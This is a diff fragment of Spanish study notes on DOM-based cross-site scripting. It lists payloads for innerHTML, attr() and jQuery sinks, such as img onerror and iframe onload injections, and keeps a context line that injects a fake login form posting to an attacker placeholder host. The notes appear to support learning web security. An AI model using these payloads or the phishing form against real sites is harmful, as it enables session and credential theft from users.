@@ -41,6 +41,14 @@ document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><inp
 ##### armado de payloads:
 
 window.location = nos permite construir un link para redireccionar a la victima a un sitio vulnerable.
+innerHTML = permite agrergar un elemento al DOM, no permite agrergar scripts directamente ni svgs, pero podemos utilizar una etiqueta html para ingresar js como:<img src=1 onerror=alert(document.domain)>
+eval()= 
+###DOM Y JQUERY
+attr()=permite modificar un elemento del dom. Podríamos aprovecharnos con un codigo como este: javascript:alert(document.domain)
+$(): función selectora, nos permite inyectar objetos en el DOM. Podemos explotarlo creando un Iframe <iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
+
+
+
 
 
 
